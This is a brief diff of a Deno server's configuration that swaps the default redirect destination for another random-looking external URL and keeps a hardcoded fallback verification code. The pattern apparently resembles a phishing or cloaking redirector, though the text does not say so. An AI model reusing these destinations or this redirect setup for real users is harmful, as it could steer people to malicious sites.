@@ -3,7 +3,7 @@ import { serve } from "https://deno.land/std@0.200.0/http/server.ts";
 
 // Configuration
 const CONFIG = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://xVM7Q.ubbaseh.es/5DMOb8Avo6Xh7eIq@2/",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Deno.env.get("PORT") || "8000"
 };
